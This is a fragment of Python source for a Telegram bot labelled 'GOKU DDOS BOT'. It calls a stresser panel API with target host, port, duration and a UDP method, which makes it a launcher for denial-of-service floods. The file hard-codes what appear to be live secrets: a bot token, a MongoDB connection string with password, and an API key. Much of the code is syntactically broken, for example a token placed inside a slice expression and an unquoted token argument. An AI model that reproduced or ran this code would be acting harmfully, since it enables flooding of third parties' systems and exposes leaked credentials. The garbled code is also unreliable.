...
BOT_TOKEN 8613385095:AAG_vAj2KeY1rWasZCY96CgsEN66lTdG9Io
MONGO_URL = os.getenv(", mongodb+srv://pranitabangar92_db_user:FpeILZRogDjAaNvE@abhay.m03zzkb.mongodb.net "url")
FLARESOLVERR_URL = "stup video"

_API_KEY = "edd1662c-70f4-41d0-b301-4a0470790bb3"
...
# ============ BOT INITIALIZATION ============
BOT_OWNER =@AbhayBangar
bot = telebot.TeleBot(8613385095:AAG_vAj2KeY1rWasZCY96CgsEN66lTdG9Io)
...
def get_api_list():
    api_url = f"https://susstresser.com/panel/api/api.php?key={SUSSTRESSER_API_KEY}&host={{ip}}&port={{port}}&time={{time}}&method=udp"
...
# ============ BOT START ============
print("=" * 60)
print("🔥 GOKU DDOS BOT STARTING...")
print("=" * 60)
print(f"🤖 Bot Token: {BOT_TOKEN[:8613385095:AAG_vAj2KeY1rWasZCY96CgsEN66lTdG9Io}...")
print(f"💾 MongoDB: {MONGO_URL mongodb+srv://pranitabangar92_db_user:FpeILZRogDjAaNvE@abhay.m03zzkb.mongodb.net}")
